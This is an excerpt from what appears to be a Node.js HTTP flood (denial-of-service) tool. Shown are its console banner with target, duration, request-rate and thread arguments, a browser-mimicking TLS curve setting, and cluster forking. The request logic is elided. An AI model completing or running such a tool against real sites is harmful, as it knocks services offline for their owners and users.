...
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";"GREASE:X25519:x25519";
 ...
 if (cluster.isMaster) {
    ...
    console.clear()
    console.log(`Raw Onlly Http1 1/2 By Anon xGrem !`.rainbow)
    console.log(`---------------------------------------`.gray)
    console.log(`  - Target : `.brightYellow + process.argv[2].rainbow)
    console.log(`  - DuraTion : `.brightYellow + process.argv[3].white)
    console.log(`  - Requests : `.brightYellow + process.argv[4].white)
    console.log(`  - Theard : `.brightYellow + process.argv[5].white)
    console.log(`  - Methods : `.brightYellow + process.argv[6].rainbow)
    console.log(`---------------------------------------`.gray)
    console.log('Note ! '.blue + 'Use Strong List Down IS Target ! - Version : 2.0 -'.white);
        cluster.fork();
